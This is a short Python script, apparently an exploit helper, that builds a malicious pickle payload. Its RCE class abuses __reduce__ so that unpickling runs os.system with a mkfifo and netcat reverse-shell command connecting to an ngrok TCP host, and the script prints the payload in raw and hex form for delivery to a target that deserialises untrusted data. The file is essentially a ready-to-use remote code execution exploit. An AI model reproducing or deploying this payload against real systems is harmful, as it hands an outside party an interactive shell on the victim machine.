import base64
from binhex import hexbin
import os
import pickle
import codecs

from itsdangerous import base64_encode
# import requests

NGROK_HOST = "0.tcp.eu.ngrok.io"  # TODO: ngrok host
NGROK_PORT = 19840  # TODO: ngrok port

class RCE:
    def __reduce__(self):
        cmd = "rm -rf /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc %s %d > /tmp/f" % ("5.tcp.eu.ngrok.io", 10506)
        # cmd = "ls"
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print("Pickled:")
    print(pickled)

    
    # print("Unpickled:")
    # print(pickle.loads(pickled))

    # a='a'
    # print(base64.urlsafe_b64encode(pickle.dumps(RCE())))
    print(codecs.encode(pickle.dumps(RCE()),'hex'))
    # base64.urlsafe_b64encode(pickle.dumps('A'))x`x`